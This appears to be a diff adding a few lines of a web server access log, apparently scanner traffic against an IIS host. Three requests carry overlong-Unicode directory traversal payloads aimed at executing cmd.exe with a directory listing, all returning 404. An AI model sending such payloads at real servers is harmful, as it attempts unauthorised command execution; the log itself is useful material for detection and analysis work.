@@ -1,0 +1,5 @@
+2018-12-31 12:02:53 10.44.0.136 GET /pbserver/..À¯..À¯..À¯..À¯..À¯../winnt/system32/cmd.exe /c+dir+c:\+/OG 8080 - 10.50.6.188 Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+5.1;+Trident/4.0) - 404 0 64 0
+2018-12-31 12:02:53 10.44.0.136 GET /pbserver/..ÁÁ..ÁÁ..ÁÁ..ÁÁ..ÁÁ../winnt/system32/cmd.exe /c+dir+c:\+/OG 8080 - 10.50.6.188 Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+5.1;+Trident/4.0) - 404 0 2 46
+2018-12-31 12:02:53 10.44.0.136 GET /Director - 443 - 10.50.6.188 Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+5.1;+Trident/4.0) - 401 0 0 0
+2018-12-31 12:02:53 10.44.0.136 GET / - 443 - 10.50.6.188 Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+5.1;+Trident/4.0) - 401 0 0 0
+2018-12-31 12:02:53 10.44.0.136 GET /pbserver/..Áœ..Áœ..Áœ..Áœ..Áœ../winnt/system32/cmd.exe /c+dir+c:\+/OG 8080 - 10.50.6.188 Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+5.1;+Trident/4.0) - 404 0 64 15
